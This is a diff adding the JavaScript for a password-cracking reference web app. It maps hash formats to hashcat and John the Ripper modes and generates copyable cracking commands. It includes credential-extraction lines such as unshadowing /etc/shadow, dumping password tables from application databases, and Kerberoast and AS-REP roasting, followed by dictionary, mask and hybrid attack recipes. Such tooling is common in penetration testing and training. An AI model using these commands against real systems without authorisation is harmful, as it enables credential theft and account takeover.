+  'sha512crypt':  {name:'sha512crypt ($6$) — Linux',hc:1800,jtr:'sha512crypt',speed:'SLOW',extract:'unshadow /etc/passwd /etc/shadow > hash.txt',example:'$6$salt$hash...',tips:'Default modern Linux. GPU helps but still slow.'},
+  'sha256crypt':  {name:'sha256crypt ($5$) — Linux',hc:7400,jtr:'sha256crypt',speed:'SLOW',extract:'unshadow /etc/passwd /etc/shadow > hash.txt',example:'$5$salt$hash...',tips:'Less common than $6$. Same approach.'},
+  'md5crypt':     {name:'md5crypt ($1$) — Linux/Cisco',hc:500,jtr:'md5crypt',speed:'MEDIUM',extract:'unshadow or show running-config (Cisco Type 5)',example:'$1$salt$hash...',tips:'Older Linux systems and Cisco Type 5 passwords.'},
+  'bcrypt':       {name:'bcrypt ($2a$/$2y$)',hc:3200,jtr:'bcrypt',speed:'VERY SLOW',extract:'Application database dump',example:'$2y$10$salt...hash...',tips:'Cost factor in prefix ($2y$10$ = 2^10 rounds). Very slow even on GPU.'},
+  'yescrypt':     {name:'yescrypt ($y$)',hc:null,jtr:'yescrypt',speed:'VERY SLOW',extract:'unshadow /etc/passwd /etc/shadow',example:'$y$j9T$salt$hash...',tips:'Modern Linux default (Debian 11+, Fedora 35+). Hashcat does NOT support — use JtR only.'},
+  'descrypt':     {name:'DES crypt',hc:1500,jtr:'descrypt',speed:'FAST',extract:'/etc/shadow on very old systems',example:'salt+11chars',tips:'Very old/legacy. Max 8 char passwords. Fast to crack.'},
+  'macos':        {name:'macOS PBKDF2-SHA512',hc:7100,jtr:'pbkdf2-hmac-sha512',speed:'VERY SLOW',extract:'sudo dscl . read /Users/USERNAME dsAttrTypeNative:ShadowHashData',example:'$ml$...',tips:'macOS 10.8+. Very slow PBKDF2.'},
+  'kerberoast':   {name:'Kerberoast TGS-REP (RC4)',hc:13100,jtr:'krb5tgs',speed:'MEDIUM',extract:'impacket-GetUserSPNs -request / Rubeus kerberoast',example:'$krb5tgs$23$*user$realm$...',tips:'Any domain user can request. RC4 is faster to crack than AES.'},
+  'kerberoast-aes':{name:'Kerberoast TGS-REP (AES)',hc:19700,jtr:'krb5tgs',speed:'SLOW',extract:'Same as RC4 but AES etype received',example:'$krb5tgs$17$ or $krb5tgs$18$',tips:'Much slower than RC4. Try /tgtdeleg with Rubeus to force RC4 downgrade.'},
+  'asrep':        {name:'AS-REP Roast',hc:18200,jtr:'krb5asrep',speed:'MEDIUM',extract:'impacket-GetNPUsers / Rubeus asreproast',example:'$krb5asrep$23$user@REALM:...',tips:'No creds needed — only valid usernames. Targets accounts without pre-auth.'},
+  'wordpress':    {name:'WordPress phpass ($P$)',hc:400,jtr:'phpass',speed:'MEDIUM',extract:'SELECT user_login,user_pass FROM wp_users;',example:'$P$B... or $H$B...',tips:'phpass portable hashing. Also used by phpBB3.'},
+  'drupal7':      {name:'Drupal 7 ($S$)',hc:7900,jtr:'drupal7',speed:'SLOW',extract:'SELECT name,pass FROM users;',example:'$S$D...',tips:'SHA-512 with high iteration count.'},
+  'joomla':       {name:'Joomla',hc:11,jtr:'joomla',speed:'FAST',extract:'SELECT username,password FROM jos_users;',example:'hash:salt',tips:'md5($pass.$salt) format.'},
+  'phpass':       {name:'phpass / phpBB3',hc:400,jtr:'phpass',speed:'MEDIUM',extract:'Application database',example:'$H$9...',tips:'Same as WordPress.'},
+  'django-pbkdf2':{name:'Django PBKDF2-SHA256',hc:10000,jtr:'django',speed:'SLOW',extract:'Application database',example:'pbkdf2_sha256$iterations$salt$hash',tips:'Slow PBKDF2. Use targeted wordlists.'},
+  'flask':        {name:'Flask / Werkzeug',hc:null,jtr:'—',speed:'VARIES',extract:'Application database or session cookie',example:'pbkdf2:sha256:iterations$salt$hash',tips:'Check Werkzeug version for specific format.'},
+  'mysql41':      {name:'MySQL 4.1+ SHA1',hc:300,jtr:'mysql-sha1',speed:'FAST',extract:'SELECT user,authentication_string FROM mysql.user;',example:'*hex (41 chars with leading *)',tips:'Strip leading * for hashcat: sed "s/^\\*//" mysql.hash'},
+  'mysql323':     {name:'MySQL 3.x',hc:200,jtr:'mysql',speed:'FAST',extract:'SELECT user,password FROM mysql.user;',example:'16 hex chars',tips:'Very old MySQL. Easy to crack.'},
+  'mssql2012':    {name:'MSSQL 2012+',hc:1731,jtr:'mssql12',speed:'MEDIUM',extract:'SELECT name,password_hash FROM sys.sql_logins;',example:'0x0200...',tips:'SHA-512 based.'},
+  'mssql2005':    {name:'MSSQL 2005',hc:132,jtr:'mssql05',speed:'FAST',extract:'SELECT name,password_hash FROM sys.sql_logins;',example:'0x0100...',tips:'SHA-1 based. Try mode 131 for MSSQL 2000.'},
+  'postgres':     {name:'PostgreSQL MD5',hc:12,jtr:'postgres',speed:'FAST',extract:'SELECT usename,passwd FROM pg_shadow;',example:'md5+32hex',tips:'md5(password+username) — username is part of the hash!'},
+  'oracle11g':    {name:'Oracle 11g+',hc:112,jtr:'oracle11',speed:'FAST',extract:'SELECT username,password FROM dba_users;',example:'hash:salt',tips:'SHA-1 based.'},
+  'mongodb':      {name:'MongoDB SCRAM',hc:24100,jtr:'—',speed:'SLOW',extract:'db.system.users.find()',example:'SCRAM-SHA-1 format',tips:'SCRAM-SHA-1 authentication.'},
+  'keepass':      {name:'KeePass (.kdbx)',hc:13400,jtr:'keepass',speed:'SLOW',extract:'keepass2john Database.kdbx > kp.hash\nsed -i "s/^Database://" kp.hash',example:'$keepass$*...',tips:'Remove "Database:" prefix for hashcat! JtR handles it as-is.'},
+  'ssh-key':      {name:'SSH Private Key',hc:'22921',jtr:'ssh',speed:'MEDIUM',extract:'ssh2john id_rsa > ssh.hash',example:'$sshng$...',tips:'JtR recommended — handles aes-256-ctr that hashcat may not. Mode varies: 22911-22951.'},
+  'zip':          {name:'ZIP Archive',hc:13600,jtr:'PKZIP',speed:'MEDIUM',extract:'zip2john archive.zip > zip.hash',example:'$pkzip2$... or $zip2$...',tips:'WinZip = 13600, PKZIP = 17200/17210/17220/17225/17230. JtR auto-detects.'},
+  'rar':          {name:'RAR Archive',hc:13000,jtr:'rar',speed:'SLOW',extract:'rar2john archive.rar > rar.hash',example:'$RAR3$... or $rar5$...',tips:'RAR3 = 12500, RAR5 = 13000.'},
+  '7z':           {name:'7-Zip Archive',hc:11600,jtr:'7z',speed:'SLOW',extract:'7z2john.pl archive.7z > 7z.hash',example:'$7z$...',tips:'AES-256 + SHA-256 key derivation.'},
+  'pdf':          {name:'PDF Document',hc:10500,jtr:'pdf',speed:'MEDIUM',extract:'pdf2john.py document.pdf > pdf.hash',example:'$pdf$...',tips:'Mode varies by PDF version: 10400 (1.1-1.3), 10500 (1.4-1.6), 10600 (1.7 L3), 10700 (1.7 L8).'},
+  'office':       {name:'MS Office Document',hc:9600,jtr:'office',speed:'SLOW',extract:'office2john.py Protected.docx > office.hash',example:'$office$...',tips:'Mode: 9400 (2007), 9500 (2010), 9600 (2013+). JtR auto-detects.'},
+  'bitlocker':    {name:'BitLocker',hc:22100,jtr:'bitlocker',speed:'EXTREME',extract:'bitlocker2john -i Backup.vhd > bl.hash\ngrep "bitlocker\\$0" bl.hash > pw.hash',example:'$bitlocker$0$...',tips:'$0 = password, $1/$2/$3 = recovery key. Extremely slow ~25 H/s CPU.'},
+  'veracrypt':    {name:'VeraCrypt',hc:13721,jtr:'veracrypt',speed:'EXTREME',extract:'Use hashcat directly on the volume',example:'Binary volume header',tips:'Modes: 13711-13773 depending on cipher/hash combo. Extremely slow.'},
+  'gpg':          {name:'GPG / PGP',hc:17010,jtr:'gpg',speed:'SLOW',extract:'gpg2john file.gpg > gpg.hash',example:'$gpg$...',tips:'Mode depends on cipher. JtR recommended.'},
+  'putty':        {name:'PuTTY Key (.ppk)',hc:15400,jtr:'putty',speed:'MEDIUM',extract:'putty2john key.ppk > putty.hash',example:'$putty$...',tips:'PuTTY private key passphrase.'},
+  'wpa':          {name:'WPA/WPA2 WiFi',hc:22000,jtr:'wpapsk',speed:'SLOW',extract:'hcxpcapngtool -o wpa.hash capture.pcapng',example:'WPA*02*...',tips:'Mode 22000 (PMKID+EAPOL). Older: 2500. Use hcxtools for capture conversion.'},
+  'md5':          {name:'MD5 (raw)',hc:0,jtr:'raw-md5',speed:'FAST',extract:'Application database or file',example:'32 hex chars',tips:'Unsalted MD5 — very fast to crack. If 32 hex, could also be NTLM (mode 1000).'},
+  'sha1':         {name:'SHA-1 (raw)',hc:100,jtr:'raw-sha1',speed:'FAST',extract:'Application database',example:'40 hex chars',tips:'Unsalted SHA-1.'},
+  'sha256':       {name:'SHA-256 (raw)',hc:1400,jtr:'raw-sha256',speed:'FAST',extract:'Application database',example:'64 hex chars',tips:'Unsalted SHA-256.'},
+  'sha512':       {name:'SHA-512 (raw)',hc:1700,jtr:'raw-sha512',speed:'FAST',extract:'Application database',example:'128 hex chars',tips:'Unsalted SHA-512.'},
+  'md4':          {name:'MD4 (raw)',hc:900,jtr:'raw-md4',speed:'FAST',extract:'NTLM is MD4-based',example:'32 hex chars',tips:'NTLM = MD4(UTF-16LE(password)). Rarely seen as standalone.'},
+  'sha1-salted':  {name:'SHA-1 salted',hc:110,jtr:'—',speed:'FAST',extract:'Application database',example:'hash:salt',tips:'sha1($salt.$pass) = mode 110. sha1($pass.$salt) = mode 120.'},
+  'sha256-salted':{name:'SHA-256 salted',hc:1410,jtr:'—',speed:'FAST',extract:'Application database',example:'hash:salt',tips:'sha256($salt.$pass) = 1410. sha256($pass.$salt) = 1420.'},
+  'hmac-sha256':  {name:'HMAC-SHA256',hc:1450,jtr:'—',speed:'FAST',extract:'API tokens, signatures',example:'hash:key',tips:'HMAC-based key verification.'},
+  'ntlm-raw':     {name:'NTLM (raw 32 hex)',hc:1000,jtr:'nt',speed:'FAST',extract:'Same as NTLM',example:'32 hex chars',tips:'Same as NTLM. MD4(UTF-16LE(password)).'},
+  'crc32':        {name:'CRC32',hc:11500,jtr:'crc32',speed:'FAST',extract:'Various',example:'8 hex chars',tips:'Not a cryptographic hash — checksum only.'},
+  'snmp':         {name:'SNMP Community String',hc:null,jtr:'—',speed:'N/A',extract:'Wireshark: filter snmp',example:'Plaintext in packet',tips:'SNMP v1/v2 community strings are plaintext. SNMPv3 uses auth hashes.'},
+  'jwt':          {name:'JWT (HS256/384/512)',hc:16500,jtr:'—',speed:'MEDIUM',extract:'Intercept in Burp/browser',example:'header.payload.signature',tips:'Only HMAC (HS256/384/512) can be brute-forced. RSA/ECDSA cannot.'},
+  'cisco-type5':  {name:'Cisco Type 5 ($1$)',hc:500,jtr:'md5crypt',speed:'MEDIUM',extract:'show running-config',example:'$1$salt$hash',tips:'Same as md5crypt.'},
+  'cisco-type8':  {name:'Cisco Type 8 ($8$)',hc:9200,jtr:'—',speed:'SLOW',extract:'show running-config',example:'$8$salt$hash',tips:'PBKDF2-SHA256. Slow.'},
+  'cisco-type9':  {name:'Cisco Type 9 ($9$)',hc:9300,jtr:'—',speed:'SLOW',extract:'show running-config',example:'$9$salt$hash',tips:'scrypt-based. Very slow.'}
+};
+
+/* ═══════════════════════════════════════════════
+   CORE — Navigation, Copy, Notifications
+   ═══════════════════════════════════════════════ */
+function nav(id){
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  const page=document.getElementById('page-'+id);
+  if(page) page.classList.add('active');
+  document.querySelectorAll('.nav-item').forEach(n=>{if(n.getAttribute('onclick')==="nav('"+id+"')") n.classList.add('active');});
+  document.getElementById('main').scrollTop=0;
+}
+
+function copyPayload(btn){
+  const item=btn.closest('.payload-item')||btn.closest('.payload-actions')?.parentElement;
+  const code=item?.querySelector('.payload-code');
+  if(code){navigator.clipboard.writeText(code.textContent.trim());btn.classList.add('copied');btn.textContent='\u2713';notify('Copied!','success');setTimeout(()=>{btn.classList.remove('copied');btn.textContent='\uD83D\uDCCB';},1200);}
+}
+function copyText(text,btn){navigator.clipboard.writeText(text);if(btn){btn.classList.add('copied');btn.textContent='\u2713';setTimeout(()=>{btn.classList.remove('copied');btn.textContent='\uD83D\uDCCB';},1200);}notify('Copied!','success');}
+function copyEl(elId){const el=document.getElementById(elId);if(!el)return;const text=el.textContent.replace(/\uD83D\uDCCB Copy/g,'').trim();navigator.clipboard.writeText(text);notify('Copied to clipboard!','success');}
+function notify(msg,type='info'){const c=document.getElementById('notif-container');const n=document.createElement('div');n.className='notif notif-'+type;n.textContent=msg;c.appendChild(n);setTimeout(()=>{n.style.opacity='0';setTimeout(()=>n.remove(),200);},2000);}
+
+const searchInput=document.getElementById('search-global');
+document.addEventListener('keydown',e=>{if((e.ctrlKey||e.metaKey)&&e.key==='k'){e.preventDefault();searchInput.focus();}});
+searchInput.addEventListener('input',function(){
+  const q=this.value.toLowerCase().trim();
+  if(!q){document.querySelectorAll('.payload-item').forEach(p=>p.style.display='');return;}
+  document.querySelectorAll('.payload-item').forEach(p=>{p.style.display=p.textContent.toLowerCase().includes(q)?'':'none';});
+});
+
+function countPayloads(){
+  const count=document.querySelectorAll('.payload-code').length;
+  document.getElementById('payload-counter').textContent=count+' commands';
+}
+
+/* ═══════════════════════════════════════════════
+   ORACLE — Auto-detect & Generate
+   ═══════════════════════════════════════════════ */
+function oracleAutoDetect(){
+  const hash=document.getElementById('oracle-hash').value.trim();
+  if(!hash) return;
+  let detected=null;
+  const len=hash.length;
+  const isHex=/^[a-fA-F0-9]+$/.test(hash);
+  // Prefix-based detection
+  if(hash.startsWith('$krb5tgs$23$'))     detected='kerberoast';
+  else if(hash.startsWith('$krb5tgs$17$')||hash.startsWith('$krb5tgs$18$')) detected='kerberoast-aes';
+  else if(hash.startsWith('$krb5asrep$'))  detected='asrep';
+  else if(hash.startsWith('$6$'))          detected='sha512crypt';
+  else if(hash.startsWith('$5$'))          detected='sha256crypt';
+  else if(hash.startsWith('$1$'))          detected='md5crypt';
+  else if(hash.startsWith('$2y$')||hash.startsWith('$2a$')||hash.startsWith('$2b$')) detected='bcrypt';
+  else if(hash.startsWith('$y$'))          detected='yescrypt';
+  else if(hash.startsWith('$DCC2$'))       detected='dcc2';
+  else if(hash.startsWith('$P$')||hash.startsWith('$H$')) detected='wordpress';
+  else if(hash.startsWith('$S$'))          detected='drupal7';
+  else if(hash.startsWith('$keepass$'))    detected='keepass';
+  else if(hash.startsWith('$sshng$'))      detected='ssh-key';
+  else if(hash.startsWith('$bitlocker$'))  detected='bitlocker';
+  else if(hash.startsWith('$office$'))     detected='office';
+  else if(hash.startsWith('$pkzip2$')||hash.startsWith('$zip2$')) detected='zip';
+  else if(hash.startsWith('$RAR3$')||hash.startsWith('$rar5$')) detected='rar';
+  else if(hash.startsWith('$7z$'))         detected='7z';
+  else if(hash.startsWith('$pdf$'))        detected='pdf';
+  else if(hash.startsWith('$8$'))          detected='cisco-type8';
+  else if(hash.startsWith('$9$'))          detected='cisco-type9';
+  else if(hash.startsWith('$gpg$'))        detected='gpg';
+  else if(hash.startsWith('$putty$'))      detected='putty';
+  else if(hash.startsWith('pbkdf2_sha256$')) detected='django-pbkdf2';
+  else if(hash.startsWith('$ml$'))         detected='macos';
+  else if(hash.startsWith('0x0200'))       detected='mssql2012';
+  else if(hash.startsWith('0x0100'))       detected='mssql2005';
+  else if(hash.startsWith('WPA*'))         detected='wpa';
+  else if(hash.includes('::')&&hash.split(':').length>=5) detected='ntlmv2';
+  else if(hash.startsWith('*')&&len===41)  detected='mysql41';
+  else if(isHex&&len===32) detected='ntlm';
+  else if(isHex&&len===40) detected='sha1';
+  else if(isHex&&len===64) detected='sha256';
+  else if(isHex&&len===128) detected='sha512';
+  else if(isHex&&len===16) detected='mysql323';
+  else if(hash.includes('.')&&hash.split('.').length===3) detected='jwt';
+
+  if(detected){
+    document.getElementById('oracle-type').value=detected;
+  }
+}
+
+function oracleFromSelect(){
+  // Clear hash input when selecting from dropdown
+}
+
+function oracleClear(){
+  document.getElementById('oracle-hash').value='';
+  document.getElementById('oracle-type').value='';
+  document.getElementById('oracle-output-wrap').style.display='none';
+}
+
+function oracleGenerate(){
+  const typeKey=document.getElementById('oracle-type').value;
+  const hashFile=document.getElementById('oracle-hashfile').value||'hash.txt';
+  const wordlist=document.getElementById('oracle-wordlist').value||'/usr/share/wordlists/rockyou.txt';
+
+  if(!typeKey){notify('Select a hash type or paste a hash first!','error');return;}
+
+  const h=HASH_DB[typeKey];
+  if(!h){notify('Unknown hash type','error');return;}
+
+  const wrap=document.getElementById('oracle-output-wrap');
+  const result=document.getElementById('oracle-result');
+  wrap.style.display='block';
+
+  const mode=h.hc;
+  const jtr=h.jtr;
+
+  let html='<h2>\uD83D\uDD2E '+h.name+'</h2>';
+
+  // Info section
+  html+='<div class="oracle-section"><h3>\uD83D\uDCCB Hash Info</h3>';
+  html+='<table class="ref-table"><tr><th>Property</th><th>Value</th></tr>';
+  html+='<tr><td>Hash Type</td><td><strong>'+h.name+'</strong></td></tr>';
+  html+='<tr><td>Hashcat Mode</td><td class="cmd">'+(mode!==null?'-m '+mode:'NOT SUPPORTED (use JtR)')+'</td></tr>';
+  html+='<tr><td>JtR Format</td><td class="cmd">--format='+jtr+'</td></tr>';
+  html+='<tr><td>Crack Speed</td><td><strong style="color:var(--'+(h.speed==='FAST'?'green':h.speed==='MEDIUM'?'amber':h.speed==='SLOW'?'orange':'red')+')">'+h.speed+'</strong></td></tr>';
+  html+='<tr><td>Example</td><td class="cmd" style="font-size:11px">'+h.example+'</td></tr>';
+  html+='</table>';
+  if(h.tips) html+='<div class="info-box warn" style="margin-top:8px"><strong>Tips:</strong> '+h.tips+'</div>';
+  html+='</div>';
+
+  // Extraction section
+  html+='<div class="oracle-section"><h3>\uD83E\uDDF0 Step 1: Extract Hash</h3>';
+  const extractLines=h.extract.split('\n');
+  extractLines.forEach(line=>{
+    html+='<div class="payload-item"><div><div class="payload-code">'+escHtml(line)+'</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">\uD83D\uDCCB</button></div></div>';
+  });
+  html+='</div>';
+
+  // Cracking commands section
+  html+='<div class="oracle-section"><h3>\u26A1 Step 2: Crack It</h3>';
+
+  if(mode!==null){
+    // Hashcat commands
+    html+='<div style="margin-bottom:6px;color:var(--text2);font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.5px">\uD83D\uDD28 Hashcat</div>';
+
+    // Dictionary
+    html+=payloadHtml('hashcat -m '+mode+' '+hashFile+' '+wordlist,'Dictionary attack (try first)');
+    // Dictionary + rules
+    html+=payloadHtml('hashcat -m '+mode+' '+hashFile+' '+wordlist+' -r /usr/share/hashcat/rules/best64.rule','Dictionary + best64 rules (recommended)');
+    html+=payloadHtml('hashcat -m '+mode+' '+hashFile+' '+wordlist+' -r /usr/share/hashcat/rules/rockyou-30000.rule','Dictionary + 30k rules (aggressive)');
+    // Mask
+    html+=payloadHtml("hashcat -a 3 -m "+mode+" "+hashFile+" '?u?l?l?l?l?l?d?d?s' --increment --increment-min=8",'Mask: Ullllldd! pattern (common enterprise policy)');
+    // Hybrid
+    html+=payloadHtml("hashcat -a 6 -m "+mode+" "+hashFile+" "+wordlist+" '?d?d?d?s'",'Hybrid: wordlist + 3 digits + special char');
+    html+=payloadHtml("hashcat -a 6 -m "+mode+" "+hashFile+" "+wordlist+" '?d?d?d?d'",'Hybrid: wordlist + 4 digits (word2024)');
+    // Show results
+    html+=payloadHtml('hashcat -m '+mode+' '+hashFile+' --show','Show cracked results from potfile');
+  }
+
+  // JtR commands
+  if(jtr && jtr!=='—'){
+    html+='<div style="margin-top:12px;margin-bottom:6px;color:var(--text2);font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.5px">\uD83D\uDD29 John the Ripper</div>';
+    if(mode===null){
+      // JtR only (e.g. yescrypt)
+      html+=payloadHtml('john --format='+jtr+' --wordlist='+wordlist+' '+hashFile,'Dictionary attack');
+      html+=payloadHtml('john --format='+jtr+' --wordlist='+wordlist+' --rules=best64 '+hashFile,'Dictionary + rules');
+    } else {
+      html+=payloadHtml('john --format='+jtr+' --wordlist='+wordlist+' '+hashFile,'JtR dictionary attack');
+    }
+    html+=payloadHtml('john --show '+hashFile,'Show cracked results');
+  }
+
+  html+='</div>';
+
+  // Complete attack plan
+  html+='<div class="oracle-section"><h3>\uD83D\uDCCB Recommended Attack Order</h3>';
+  html+='<div class="step-list">';
+  html+='<div class="step"><div class="step-num">1</div><div class="step-content"><div class="step-title">Quick Dictionary</div><div class="step-body">'+(mode!==null?'hashcat -m '+mode+' '+hashFile+' '+wordlist:'john --format='+jtr+' --wordlist='+wordlist+' '+hashFile)+'</div></div></div>';
+  html+='<div class="step"><div class="step-num">2</div><div class="step-content"><div class="step-title">Dictionary + Rules</div><div class="step-body">'+(mode!==null?'hashcat -m '+mode+' '+hashFile+' '+wordlist+' -r /usr/share/hashcat/rules/best64.rule':'john --format='+jtr+' --wordlist='+wordlist+' --rules=best64 '+hashFile)+'</div></div></div>';
+  html+='<div class="step"><div class="step-num">3</div><div class="step-content"><div class="step-title">Aggressive Rules</div><div class="step-body">'+(mode!==null?'hashcat -m '+mode+' '+hashFile+' '+wordlist+' -r /usr/share/hashcat/rules/rockyou-30000.rule':'john --format='+jtr+' --wordlist='+wordlist+' --rules=all '+hashFile)+'</div></div></div>';
+  if(mode!==null){
+    html+='<div class="step"><div class="step-num">4</div><div class="step-content"><div class="step-title">Mask (Pattern Brute-Force)</div><div class="step-body">hashcat -a 3 -m '+mode+' '+hashFile+" '?u?l?l?l?l?l?d?d?s' --increment --increment-min=8</div></div></div>";
+    html+='<div class="step"><div class="step-num">5</div><div class="step-content"><div class="step-title">Hybrid (Wordlist + Append)</div><div class="step-body">hashcat -a 6 -m '+mode+' '+hashFile+' '+wordlist+" '?d?d?d?s'</div></div></div>";
+  }
+  html+='</div></div>';
+
+  result.innerHTML=html;
+  wrap.scrollIntoView({behavior:'smooth'});
+  // Recount payloads
+  setTimeout(countPayloads,100);
+}
+
+function payloadHtml(code,desc){
+  return '<div class="payload-item"><div><div class="payload-code">'+escHtml(code)+'</div><div class="payload-desc">'+desc+'</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">\uD83D\uDCCB</button></div></div>';
+}
+function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+
+/* ═══════════════════════════════════════════════
+   HASH IDENTIFIER
+   ═══════════════════════════════════════════════ */
+function identifyHash(){
+  const hash=document.getElementById('hi-hash').value.trim();
+  const results=document.getElementById('hi-results');
+  if(!hash){results.innerHTML='';return;}
+  let matches=[];
+  const len=hash.length;
+  const isHex=/^[a-fA-F0-9]+$/.test(hash);
+  if(hash.startsWith('$1$')) matches.push({name:'md5crypt',hc:500,jtr:'md5crypt'});
+  if(hash.startsWith('$5$')) matches.push({name:'sha256crypt',hc:7400,jtr:'sha256crypt'});
+  if(hash.startsWith('$6$')) matches.push({name:'sha512crypt',hc:1800,jtr:'sha512crypt'});
+  if(hash.startsWith('$2y$')||hash.startsWith('$2a$')||hash.startsWith('$2b$')) matches.push({name:'bcrypt',hc:3200,jtr:'bcrypt'});
+  if(hash.startsWith('$y$')) matches.push({name:'yescrypt',hc:'N/A',jtr:'yescrypt'});
+  if(hash.startsWith('$krb5tgs$')) matches.push({name:'Kerberoast TGS-REP',hc:13100,jtr:'krb5tgs'});
+  if(hash.startsWith('$krb5asrep$')) matches.push({name:'AS-REP Roast',hc:18200,jtr:'krb5asrep'});
+  if(hash.startsWith('$DCC2$')) matches.push({name:'DCC2 / MS Cache 2',hc:2100,jtr:'mscach2'});
+  if(hash.startsWith('$keepass$')) matches.push({name:'KeePass',hc:13400,jtr:'keepass'});
+  if(hash.startsWith('$sshng$')) matches.push({name:'SSH Private Key',hc:'2291x',jtr:'ssh'});
+  if(hash.startsWith('$bitlocker$')) matches.push({name:'BitLocker',hc:22100,jtr:'bitlocker'});
+  if(hash.startsWith('$office$')) matches.push({name:'MS Office',hc:'9400-9600',jtr:'office'});
+  if(hash.startsWith('$P$')||hash.startsWith('$H$')) matches.push({name:'WordPress/phpBB (phpass)',hc:400,jtr:'phpass'});
+  if(hash.startsWith('$S$')) matches.push({name:'Drupal 7',hc:7900,jtr:'drupal7'});
+  if(hash.startsWith('$pkzip2$')||hash.startsWith('$zip2$')) matches.push({name:'ZIP Archive',hc:13600,jtr:'PKZIP'});
+  if(hash.startsWith('$8$')) matches.push({name:'Cisco Type 8',hc:9200,jtr:'—'});
+  if(hash.startsWith('$9$')) matches.push({name:'Cisco Type 9',hc:9300,jtr:'—'});
+  if(hash.startsWith('pbkdf2_sha256$')) matches.push({name:'Django PBKDF2',hc:10000,jtr:'django'});
+  if(hash.includes('::')&&hash.split(':').length>=5) matches.push({name:'Net-NTLMv2',hc:5600,jtr:'netntlmv2'});
+  if(hash.startsWith('*')&&len===41) matches.push({name:'MySQL 4.1+',hc:300,jtr:'mysql-sha1'});
+  if(hash.startsWith('0x0200')) matches.push({name:'MSSQL 2012+',hc:1731,jtr:'mssql12'});
+  if(hash.startsWith('0x0100')) matches.push({name:'MSSQL 2005',hc:132,jtr:'mssql05'});
+  if(hash.startsWith('WPA*')) matches.push({name:'WPA/WPA2',hc:22000,jtr:'wpapsk'});
+  if(isHex&&len===32){matches.push({name:'MD5',hc:0,jtr:'raw-md5'});matches.push({name:'NTLM',hc:1000,jtr:'nt'});matches.push({name:'MD4',hc:900,jtr:'raw-md4'});matches.push({name:'LM',hc:3000,jtr:'lm'});}
+  if(isHex&&len===40) matches.push({name:'SHA-1',hc:100,jtr:'raw-sha1'});
+  if(isHex&&len===64) matches.push({name:'SHA-256',hc:1400,jtr:'raw-sha256'});
+  if(isHex&&len===128) matches.push({name:'SHA-512',hc:1700,jtr:'raw-sha512'});
+  if(isHex&&len===16) matches.push({name:'MySQL 3.x',hc:200,jtr:'mysql'});
+  if(hash.includes('.')&&hash.split('.').length===3&&!hash.startsWith('$')) matches.push({name:'JWT (HS256)',hc:16500,jtr:'—'});
+  if(matches.length===0){results.innerHTML='<div class="info-box warn">Could not auto-identify. Try: hashid -m \''+escHtml(hash.substring(0,50))+'\' or nth --text \'HASH\'</div>';return;}
+  let html='<table class="ref-table"><tr><th>Possible Type</th><th>Hashcat Mode</th><th>JtR Format</th><th>Quick Crack</th></tr>';
+  matches.forEach(m=>{
+    html+='<tr><td><strong>'+m.name+'</strong></td><td class="cmd">-m '+m.hc+'</td><td class="cmd">'+m.jtr+'</td><td class="cmd">hashcat -m '+m.hc+' hash.txt rockyou.txt</td></tr>';
+  });
+  html+='</table>';
+  results.innerHTML=html;
+}
+
+/* ═══════════════════════════════════════════════
+   ATTACK BUILDER
+   ═══════════════════════════════════════════════ */
+function genHashcat(){
+  const mode=document.getElementById('hc-mode').value;
+  const attack=document.getElementById('hc-attack').value;
+  const hashfile=document.getElementById('hc-hashfile').value||'hash.txt';
+  const wordlist=document.getElementById('hc-wordlist').value||'/usr/share/wordlists/rockyou.txt';
+  const rules=document.getElementById('hc-rules').value||'/usr/share/hashcat/rules/best64.rule';
+  const mask=document.getElementById('hc-mask').value||'?u?l?l?l?l?d?s';
+  const force=document.getElementById('hc-force').checked?' --force':'';
+  let cmd='';
+  if(attack==='0') cmd='hashcat -m '+mode+' '+hashfile+' '+wordlist+force;
+  else if(attack==='0r') cmd='hashcat -m '+mode+' '+hashfile+' '+wordlist+' -r '+rules+force;
+  else if(attack==='3') cmd="hashcat -a 3 -m "+mode+" "+hashfile+" '"+mask+"'"+force;
+  else if(attack==='1') cmd='hashcat -a 1 -m '+mode+' '+hashfile+' '+wordlist+' wordlist2.txt'+force;
+  else if(attack==='6') cmd="hashcat -a 6 -m "+mode+" "+hashfile+" "+wordlist+" '"+mask+"'"+force;
+  else if(attack==='7') cmd="hashcat -a 7 -m "+mode+" "+hashfile+" '"+mask+"' "+wordlist+force;
+  const out=document.getElementById('hc-output');
+  out.style.display='block';
+  out.innerHTML='<button class="btn btn-copy copy-gen" onclick="copyEl(\'hc-output\')">\uD83D\uDCCB Copy</button># Hashcat Command\n'+cmd+'\n\n# Show cracked results\nhashcat -m '+mode+' '+hashfile+' --show';
+}
+
+function genJohn(){
+  const hashfile=document.getElementById('hc-hashfile').value||'hash.txt';
+  const wordlist=document.getElementById('hc-wordlist').value||'/usr/share/wordlists/rockyou.txt';
+  const rules=document.getElementById('hc-rules').value;
+  let cmd='john --wordlist='+wordlist+' '+hashfile;
+  if(rules) cmd='john --wordlist='+wordlist+' --rules=custom '+hashfile;
+  const out=document.getElementById('hc-output');
+  out.style.display='block';
+  out.innerHTML='<button class="btn btn-copy copy-gen" onclick="copyEl(\'hc-output\')">\uD83D\uDCCB Copy</button># John the Ripper Command\n'+cmd+'\n\n# Show cracked results\njohn --show '+hashfile;
+}
+
+/* ═══════════════════════════════════════════════
+   MASK GENERATOR
+   ═══════════════════════════════════════════════ */
+function genMask(){
+  const mode=document.getElementById('mask-mode').value||'1000';
+  const file=document.getElementById('mask-file').value||'hash.txt';
+  const min=parseInt(document.getElementById('mask-min').value)||8;
+  const max=parseInt(document.getElementById('mask-max').value)||10;
+  const upper=document.getElementById('mask-upper').checked;
+  const lower=document.getElementById('mask-lower').checked;
+  const digit=document.getElementById('mask-digit').checked;
+  const special=document.getElementById('mask-special').checked;
+  let cs='';
+  if(upper) cs+='?u';if(lower) cs+='?l';if(digit) cs+='?d';if(special) cs+='?s';
+  if(!cs) cs='?a';
+  let maskStr='';for(let i=0;i<max;i++) maskStr+=cs.length<=2?cs:'?1';
+  let customCs=cs.length>2?"-1 '"+cs+"' ":'';
+  let cmd="hashcat -a 3 -m "+mode+" "+file+" "+customCs+"'"+maskStr+"'";
+  if(min<max) cmd+=" --increment --increment-min="+min;
